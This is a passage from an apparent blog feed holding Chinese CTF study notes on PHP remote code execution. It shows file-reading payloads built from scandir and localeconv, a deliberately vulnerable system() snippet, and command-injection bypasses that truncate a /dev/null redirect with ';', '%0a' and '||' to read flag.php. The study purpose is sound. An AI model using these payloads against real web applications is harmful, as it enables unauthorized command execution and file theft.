class=&#34;line&#34;&gt;?c=readfile(next(array_reverse(scandir(current(localeconv())))));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#show_source()与作用相同highlight_file()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=show_source(next(array_reverse(scandir(pos(localeconv())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;没过滤-或运算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没过滤-或运算&#34;&gt;#&lt;/a&gt; 没过滤 | 或运算&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;hint 给了羽师傅的脚本，在小皮根目录的 rce_or&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;![屏幕截图 2023-09-11 193956](C:\Users\dell\Desktop\ 笔记 \ 屏幕截图 2023-09-11 193956.png)&lt;/p&gt;
+&lt;h2 id=&#34;黑洞文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黑洞文件&#34;&gt;#&lt;/a&gt; 黑洞文件&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $c=$_GET[&amp;#x27;c&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system($c.&amp;quot; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;/dev/null 文件可以被看作是一个 “黑洞” 文件。它等价于一个只写的的文件。所有写入它的内容都会永远丢失 (因为不可读)。&lt;br&gt;
+/dev/null 2&amp;gt;&amp;amp;1 主要意思是不进行回显，让命令回显，我们进行命令分隔&lt;br&gt;
+输出黑洞&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1：&amp;gt; 代表重定向到哪里，例如：echo “123” &amp;gt; /home/123.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2：/dev/null 代表空设备文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3：2&amp;gt; 表示stderr标准错误&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4：&amp;amp; 表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5：1 表示stdout标准输出，系统默认值是1，所以&amp;quot;&amp;gt;/dev/null&amp;quot;等同于 “1&amp;gt;/dev/null”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因此，&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 也可以写成“1&amp;gt; /dev/null 2&amp;gt; &amp;amp;1”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;为了不让后面的重定向符号执行，就需要把后面截断像 ``;,%0a,%26 以及 ||` 这类都可以&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=tac flag.php;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=cat flag.php%0a(flag.php前面不能加/)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=tac fla*%0a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这个也可以用通配符 *&lt;/p&gt;
  ]]></description>
         </item>
         <item>
